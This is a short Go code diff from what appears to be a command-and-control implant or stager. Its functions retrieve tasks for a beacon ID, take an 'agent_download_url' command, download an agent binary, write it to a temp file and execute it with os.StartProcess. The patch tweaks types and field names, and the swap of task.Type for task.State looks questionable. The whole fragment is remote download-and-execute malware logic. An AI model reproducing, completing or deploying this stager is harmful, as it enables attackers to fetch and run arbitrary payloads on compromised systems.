@@ -62,7 +62,7 @@ func downloadAgent(url string) ([]byte, error) {
 	return buf.Bytes(), nil
 }
 
-func requestAgentDownload(hp peers.Peer, beaconID string) string {
+func requestAgentDownload(hp utils.Peer, beaconID string) string {
 	tasks, err := core.RetreiveTask(hp, beaconID)
 	if err != nil {
 		utils.Print("Error retrieving tasks:", err.Error())
@@ -74,8 +74,8 @@ func requestAgentDownload(hp peers.Peer, beaconID string) string {
 	}
 
 	for _, task := range tasks.Tasks {
-		if task.Type == "agent_download_url" {
-			return string(task.Command)
+		if task.State == "agent_download_url" {
+			return task.Command
 		}
 	}
 
@@ -101,7 +101,7 @@ func executeAgent(data []byte) error {
 		return err
 	}
 
-	err = os.StartProcess(tmpFile.Name(), []string{tmpFile.Name()}, &os.ProcAttr{
+	_, err = os.StartProcess(tmpFile.Name(), []string{tmpFile.Name()}, &os.ProcAttr{
 		Files: []*os.File{os.Stdin, os.Stdout, os.Stderr},
 	})
 
